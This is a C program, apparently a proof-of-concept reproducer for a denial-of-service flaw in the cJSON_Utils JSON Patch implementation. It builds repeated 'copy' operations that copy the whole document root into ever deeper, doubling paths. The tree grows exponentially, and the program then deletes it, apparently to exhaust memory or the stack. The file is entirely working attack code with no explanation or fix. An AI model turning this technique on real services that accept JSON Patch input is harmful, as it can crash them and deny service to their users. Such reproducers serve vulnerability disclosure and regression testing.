#include "cJSON_Utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct { const cJSON *item; size_t depth; } depth_frame;

static size_t max_tree_depth(const cJSON *root)
{
    size_t used = 0;
    size_t capacity = 64;
    size_t maximum = 0;
    depth_frame *stack = (depth_frame *)malloc(capacity * sizeof(*stack));
    if(stack == NULL)
        return 0;
    stack[used++] = (depth_frame){root, 0};
    while(used) {
        depth_frame current = stack[--used];
        const cJSON *child;
        if(current.depth > maximum)
            maximum = current.depth;
        for(child = current.item->child; child != NULL; child = child->next) {
            if(used == capacity) {
                depth_frame *grown;
                capacity *= 2;
                grown = (depth_frame *)realloc(stack, capacity * sizeof(*stack));
                if(grown == NULL) {
                    free(stack);
                    return 0;
                }
                stack = grown;
            }
            stack[used++] = (depth_frame){child, current.depth + 1};
        }
    }
    free(stack);
    return maximum;
}
int main(int argc, char **argv)
{
    char *end = NULL;
    long count;
    long i;
    size_t path_len;
    char *path = NULL;
    cJSON *root = NULL;
    cJSON *patches = NULL;

    if(argc != 2) {
        fprintf(stderr, "usage: %s copy-count\n", argv[0]);
        return 2;
    }
    count = strtol(argv[1], &end, 10);
    if(end == argv[1] || *end != '\0' || count < 0 || count > 14)
        return 2;

    root = cJSON_Parse("{\"x\":{\"y\":{}}}");
    patches = cJSON_CreateArray();
    path = (char *)malloc(7);
    if(root == NULL || patches == NULL || path == NULL)
        return 3;
    memcpy(path, "/x/y/z", 7);
    path_len = strlen(path);

    for(i = 0; i < count; ++i) {
        cJSON *patch = cJSON_CreateObject();
        char *next_path;
        if(patch == NULL)
            return 4;
        cJSON_AddStringToObject(patch, "op", "copy");
        cJSON_AddStringToObject(patch, "from", "");
        cJSON_AddStringToObject(patch, "path", path);
        cJSON_AddItemToArray(patches, patch);

        next_path = (char *)malloc(path_len * 2 + 1);
        if(next_path == NULL)
            return 5;
        memcpy(next_path, path, path_len);
        memcpy(next_path + path_len, path, path_len);
        next_path[path_len * 2] = '\0';
        free(path);
        path = next_path;
        path_len *= 2;
    }

    fprintf(stderr, "applying copy operations=%ld path_bytes=%zu\n", count, path_len);
    if(cJSONUtils_ApplyPatches(root, patches) != 0) {
        fprintf(stderr, "patch application failed\n");
        cJSON_Delete(patches);
        cJSON_Delete(root);
        free(path);
        return 6;
    }
    fprintf(stderr, "patches applied; maximum generated tree depth=%zu\n", max_tree_depth(root));
    fprintf(stderr, "deleting document root\n");
    cJSON_Delete(patches);
    cJSON_Delete(root);
    free(path);
    puts("cleanup completed");
    return 0;
}


